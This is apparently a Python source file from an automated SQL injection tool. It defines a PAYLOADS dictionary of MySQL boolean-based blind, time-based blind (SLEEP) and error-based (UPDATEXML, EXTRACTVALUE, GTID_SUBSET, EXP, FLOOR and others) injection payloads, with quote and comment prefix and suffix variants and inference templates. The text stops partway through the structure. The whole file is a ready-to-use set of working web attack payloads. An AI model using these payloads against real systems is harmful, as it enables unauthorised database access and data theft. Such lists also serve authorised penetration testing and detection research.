PAYLOADS = {
    "MySQL": {
        "boolean-based": [
            {
                "payload": "AND [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": "#"},
                    {"pref": "' ", "suf": "#"},
                    {"pref": '" ', "suf": "#"},
                    {"pref": ") ", "suf": "#"},
                    {"pref": "') ", "suf": "#"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "AND boolean-based blind - WHERE or HAVING clause (MySQL comment)",
                "vector": "AND [INFERENCE]",
                "dbms": "MySQL",
            },
            {
                "payload": "OR [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": "#"},
                    {"pref": "' ", "suf": "#"},
                    {"pref": '" ', "suf": "#"},
                    {"pref": ") ", "suf": "#"},
                    {"pref": "') ", "suf": "#"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "OR boolean-based blind - WHERE or HAVING clause (MySQL comment)",
                "vector": "OR [INFERENCE]",
                "dbms": "MySQL",
            },
            {
                "payload": "OR NOT [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": "#"},
                    {"pref": "' ", "suf": "#"},
                    {"pref": '" ', "suf": "#"},
                    {"pref": ") ", "suf": "#"},
                    {"pref": "') ", "suf": "#"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)",
                "vector": "OR NOT [INFERENCE]",
                "dbms": "MySQL",
            },
            {
                "payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))",
                "comments": [
                    {"pref": "", "suf": ""},
                    # {"pref": " AND 08654 ", "suf": "-- wXyW"},
                    # {"pref": "' ", "suf": "-- wXyW"},
                    # {"pref": '" ', "suf": "-- wXyW"},
                    # {"pref": ") ", "suf": "-- wXyW"},
                    # {"pref": "') ", "suf": "-- wXyW"},
                    # {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
                "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
                "dbms": "MySQL",
            },
            {
                "payload": "(IF([RANDNUM]=[RANDNUM],1,(select table_name from information_schema.tables)))",
                "comments": [
                    {"pref": "'AND", "suf": "AND'Z"},
                    {"pref": '"AND', "suf": 'AND"Z'},
                    {"pref": "'XOR", "suf": "XOR'Z"},
                    {"pref": '"XOR', "suf": 'XOR"Z'},
                    {"pref": "'OR", "suf": "OR'Z"},
                    {"pref": '"OR', "suf": 'OR"Z'},
                ],
                "title": "MySQL boolean-based blind - (IF STATEMENT)",
                "vector": "(IF([INFERENCE],1,(select table_name from information_schema.tables)))",
                "dbms": "MySQL",
            },
        ],
        "time-based": [
            {
                "payload": "(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
                "comments": [
                    {"pref": "'XOR", "suf": "XOR'Z"},
                    {"pref": '"XOR', "suf": 'XOR"Z'},
                    {"pref": "", "suf": ""},
                    {"pref": "'+", "suf": "+'"},
                    {"pref": '"+', "suf": '+"'},
                    {"pref": "'OR", "suf": "OR'Z"},
                    {"pref": '"OR', "suf": 'OR"Z'},
                    {"pref": "'AND", "suf": "AND'Z"},
                    {"pref": '"AND', "suf": 'AND"Z'},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                    # {"pref": ")OR", "suf": "OR(1=1-- wXyW"},
                    # {"pref": "')OR", "suf": "OR('1'='1-- wXyW"},
                    # {"pref": '")OR', "suf": 'OR("1"="1-- wXyW'},
                    # {"pref": ") AND", "suf": "AND-- wXyW"},
                    # {"pref": "')AND", "suf": "AND('1'='1-- wXyW"},
                    # {"pref": '")AND', "suf": 'AND("1"="1-- wXyW'},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                "dbms": "MySQL",
            },
            {
                "payload": "if(now()=sysdate(),SLEEP([SLEEPTIME]),0)",
                "comments": [
                    {"pref": "'XOR(", "suf": ")XOR'Z"},
                    {"pref": '"XOR(', "suf": ')XOR"Z'},
                    {"pref": "", "suf": ""},
                    {"pref": "", "suf": "-- wXyW"},
                    {"pref": "'AND(", "suf": ")AND'Z"},
                    {"pref": "'OR(", "suf": ")OR'Z"},
                    {"pref": '"OR(', "suf": ')OR"Z'},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                    # {"pref": ") OR ", "suf": "OR(1=1-- wXyW"},
                    # {"pref": "') OR ", "suf": "OR('1'='1 wXyW"},
                    # {"pref": '") OR ', "suf": 'OR("1"="1-- wXyW'},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (IF - comment)",
                "vector": "if([INFERENCE],SLEEP([SLEEPTIME]),0)",
                "dbms": "MySQL",
            },
            {
                "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
                "comments": [
                    {"pref": "'XOR", "suf": "XOR'Z"},
                    {"pref": '"XOR', "suf": 'XOR"Z'},
                    {"pref": "", "suf": ""},
                    {"pref": "'OR", "suf": "OR'Z"},
                    {"pref": "'AND", "suf": "AND'Z"},
                    {"pref": "'+", "suf": "+'"},
                    {"pref": "", "suf": "-- wXyW"},
                    {"pref": '"AND', "suf": 'AND"Z'},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                    # {"pref": ")", "suf": "-- wXyW"},
                    # {"pref": "')", "suf": "-- wXyW"},
                    # {"pref": '")', "suf": "-- wXyW"},
                    # {"pref": ")", "suf": "XOR(1=1-- wXyW"},
                    # {"pref": "')", "suf": "XOR('1'='1 wXyW"},
                    # {"pref": '")', "suf": 'XOR("1"="1-- wXyW'},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (CASE STATEMENT)",
                "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
                "dbms": "MySQL",
            },
            {
                "payload": "SLEEP([SLEEPTIME])",
                "comments": [
                    {"pref": " AND ", "suf": ""},
                    # {"pref": " OR ", "suf": ""},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    # {"pref": " OR ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    # {"pref": "' OR ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    # {"pref": '" OR ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    # {"pref": ") OR ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    # {"pref": "') OR ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                    # {"pref": '") OR ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (SLEEP)",
                "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
                "dbms": "MySQL",
            },
        ],
        "error-based": [
            {
                "payload": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",
                "vector": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)",
                "vector": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)",
                "vector": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
                "dbms": "MySQL",
            },
            {
                "payload": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)",
                "vector": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
                "dbms": "MySQL",
            },
            {
                "payload": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
                "vector": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)",
                "vector": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)",
                "vector": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
                "dbms": "MySQL",
            },
            {
                "payload": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)",
                "vector": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
                "dbms": "MySQL",
            },
            {
                "payload": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)",
                "vector": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)",
                "vector": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
                "vector": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,[INFERENCE],FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)",
                "vector": "OR 1 GROUP BY CONCAT_WS(0x7e,[INFERENCE],FLOOR(RAND(0)*2))HAVING(MIN(0))",
                "dbms": "MySQL",
            },
            {
                "payload": "UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": "(", "suf": ")"},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": " AND ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
                "vector": "UPDATEXML(0,CONCAT(0x7e,[INFERENCE],0x7e),0)",
                "dbms": "MySQL",
            },
            {
                "payload": "EXTRACTVALUE(0,CONCAT(0x7e,0x72306f746833783439,0x7e))",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": "(", "suf": ")"},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": " AND ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
                "vector": "EXTRACTVALUE(0,CONCAT(0x7e,[INFERENCE],0x7e))",
                "dbms": "MySQL",
            },
            {
                "payload": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
                "vector": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND UPDATEXML(0,CONCAT_WS('(', '~','r0oth3x49','~'),0)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
                "vector": "AND UPDATEXML(0,CONCAT_WS('(', '~',[INFERENCE],'~'),0)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)",
                "vector": "AND UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0)",
                "dbms": "MySQL",
            },
            {
                "payload": "PROCEDURE ANALYSE(UPDATEXML(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e),0),1)",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PROCEDURE ANALYSE)",
                "vector": "PROCEDURE ANALYSE(UPDATEXML(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e),0),1)",
                "dbms": "MySQL",
            },
